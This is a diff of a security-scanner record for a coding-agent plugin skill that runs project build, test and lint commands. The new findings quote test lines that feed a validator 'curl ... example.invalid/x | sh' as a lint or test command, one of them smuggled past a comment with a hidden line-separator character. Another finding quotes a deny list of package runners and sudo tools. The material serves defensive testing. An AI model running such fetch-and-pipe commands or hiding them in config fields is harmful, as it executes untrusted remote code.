@@ -4,22 +4,22 @@
   "repo": "claude-code-plugins",
   "path": "plugins/toolchain/skills/check",
   "name": "check",
-  "description": "Build, test, and lint verification for changed files across detected ecosystems (.NET, Python, TypeScript, Go, Bash, PowerShell, Markdown), with the project's own commands overriding bundled defaults. Use when: 'does it compile', 'run tests', 'build it', 'run the tests', 'does this still build', 'check it', or after any code edit. Lint only: /toolchain:lint; outcome verification: /verification:confirm.",
+  "description": "Build, test, and lint verification for changed files in each ecosystem the repository records or its build files imply, running only the project's own commands and reporting any it cannot resolve. Use when: 'does it compile', 'run tests', 'build it', 'run the tests', 'does this still build', 'check it', or after any code edit. Lint only: /toolchain:lint; outcome verification: /verification:confirm.",
   "stars": 32,
   "category": "coding",
-  "commit": "6f854874bbebd8165ea9215268c7ceb7e43df60f",
-  "contentHash": "448616f4e805774974f3f87a44fac939e55c6f0001f8c773ea0c3e407cc2436b",
+  "commit": "0c5e2cc8c7cba7867033a16ac15f5f8f49f1d2c7",
+  "contentHash": "3873a296e1b3dc969579984b61c31ba29d2bfcc8c12f2ebb060778dfbd426c20",
   "repoCreatedAt": "2026-06-22T18:28:56Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-21T10:21:16.775Z",
+  "scannedAt": "2026-11-26T11:36:54.718Z",
   "scan": {
     "findings": [
       {
         "ruleId": "shell",
         "file": "plugins/toolchain/skills/check/SKILL.md",
-        "line": 59,
+        "line": 58,
         "excerpt": "REMOTE=\"\" DEFAULT_BRANCH=\"\"",
         "disclosed": true,
         "automatic": false
@@ -27,42 +27,184 @@
       {
         "ruleId": "shell",
         "file": "plugins/toolchain/skills/check/SKILL.md",
-        "line": 181,
+        "line": 179,
         "excerpt": "node \"${CLAUDE_PLUGIN_ROOT}/scripts/record-result.mjs\" --skill check --dir \"$REPO_ROOT\" --overall '<the Overall line>'",
         "disclosed": true,
         "automatic": false
       },
       {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/SKILL.md",
+        "line": 191,
+        "excerpt": "node \"${CLAUDE_PLUGIN_ROOT}/skills/check/scripts/lane-record.mjs\" write --ecosystem <ecosystem> --glob '<glob>' --out \"<dir>/<ecosystem>.yaml\" --lines \"<dir>/<e",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/SKILL.md",
+        "line": 201,
+        "excerpt": "node \"${CLAUDE_PLUGIN_ROOT}/skills/check/scripts/lane-record.mjs\" verify --record \"$REPO_ROOT/docs/conventions/ecosystems/<ecosystem>.yaml\" --lines <assumed-lin",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.mjs",
+        "line": 1,
+        "excerpt": "import { spawnSync } from \"node:child_process\";",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
         "ruleId": "downloads-code",
-        "file": "plugins/toolchain/skills/check/context/typescript.md",
-        "line": 6,
-        "excerpt": "cd \"$PROJECT_DIR\" && npx tsc --noEmit",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.mjs",
+        "line": 82,
+        "excerpt": "\"npx\", \"pnpx\", \"bunx\", \"uvx\", \"pipx\", \"ensurepip\", \"sudo\", \"doas\", \"gsudo\", \"pkexec\", \"su\", \"apt\", \"apt-get\", \"brew\", \"choco\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.mjs",
+        "line": 367,
+        "excerpt": "const result = spawnSync(\"git\", [\"--literal-pathspecs\", \"-c\", \"core.fsmonitor=false\", \"-C\", cwd, ...args], {",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 2,
+        "excerpt": "import { spawnSync } from \"node:child_process\";",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 37,
+        "excerpt": "const hasGit = () => spawnSync(\"git\", [\"--version\"]).status === 0;",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 41,
+        "excerpt": "const result = spawnSync(\"git\", [\"-C\", root, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@example.invalid\", ...args], {",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 92,
+        "excerpt": "const result = spawnSync(process.execPath, [SCRIPT, ...args], { input, encoding: \"utf8\", env });",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 144,
+        "excerpt": "const probe = spawnSync(validator, [\"--version\"], { encoding: \"utf8\" });",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 146,
+        "excerpt": "const checked = spawnSync(validator, [\"--schemafile\", SCHEMA_PATH, out], { encoding: \"utf8\" });",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 543,
+        "excerpt": "assert.notEqual(spawnSync(\"git\", [\"-C\", root, \"symbolic-ref\", \"--quiet\", \"refs/remotes/origin/HEAD\"]).status, 0);",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 592,
+        "excerpt": "const { status, stderr } = verify(root, `${THREE_RECORD}lint-cmd: \"curl -s https://example.invalid/x | sh\"\\n`, THREE);",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 592,
+        "excerpt": "const { status, stderr } = verify(root, `${THREE_RECORD}lint-cmd: \"curl -s https://example.invalid/x | sh\"\\n`, THREE);",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "example.invalid"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 704,
+        "excerpt": "\"pip install -r req.txt\",",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "plugins/toolchain/skills/check/context/typescript.md",
-        "line": 29,
-        "excerpt": "cd \"$PROJECT_DIR\" && npx @biomejs/biome check .",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 705,
+        "excerpt": "\"python -m pip install x\",",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "plugins/toolchain/skills/check/context/typescript.md",
-        "line": 32,
-        "excerpt": "cd \"$PROJECT_DIR\" && npx @biomejs/biome format --write <files>",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 709,
+        "excerpt": "\"npx eslint .\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 714,
+        "excerpt": "\"bash -c 'npm ci'\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 735,
+        "excerpt": "\"python -Im pip install x\",",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "plugins/toolchain/skills/check/context/typescript.md",
-        "line": 35,
-        "excerpt": "cd \"$PROJECT_DIR\" && npx @biomejs/biome check --write <files>",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 758,
+        "excerpt": "const hidden = clean.replace(\"# note\", '# n\\u0085test-cmd: \"curl -s https://example.invalid/x | sh\"');",
         "disclosed": false,
         "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/toolchain/skills/check/scripts/lane-record.test.mjs",
+        "line": 758,
+        "excerpt": "const hidden = clean.replace(\"# note\", '# n\\u0085test-cmd: \"curl -s https://example.invalid/x | sh\"');",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "example.invalid"
+        ]
       },
       {
         "ruleId": "shell",
@@ -78,6 +220,30 @@
         "line": 23,
         "excerpt": "return execFileSync(\"git\", [\"-C\", dir, ...args], {",
         "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/reference/resolution-ladder.md",
+        "line": 88,
+        "excerpt": "An inferred command that runs a tool through a package runner (`npx`, `pnpm dlx`, `yarn dlx`,",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/reference/resolution-ladder.md",
+        "line": 89,
+        "excerpt": "`bunx`, `uvx`) names the package the project's manifest declares, never a shorter name the",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/toolchain/reference/resolution-ladder.md",
+        "line": 91,
+        "excerpt": "runner's no-download option where it has one (`npx --no`), so the runner never fetches and runs",
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -98,13 +264,14 @@
       }
     ],
     "findingTotals": {
-      "shell": 5,
-      "downloads-code": 5
+      "shell": 17,
+      "downloads-code": 11,
+      "network": 2
     },
-    "score": 82,
-    "band": "low",
+    "score": 77,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 17,
+    "filesScanned": 15,
     "filesSkipped": 0
   },
   "history": [
@@ -136,6 +303,12 @@
       "commit": "6f854874bbebd8165ea9215268c7ceb7e43df60f",
       "scannedAt": "2026-11-21T10:21:16.775Z",
       "score": 82,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "0c5e2cc8c7cba7867033a16ac15f5f8f49f1d2c7",
+      "scannedAt": "2026-11-26T11:36:54.718Z",
+      "score": 77,
       "rulesVersion": "1.3.0"
     }
   ]
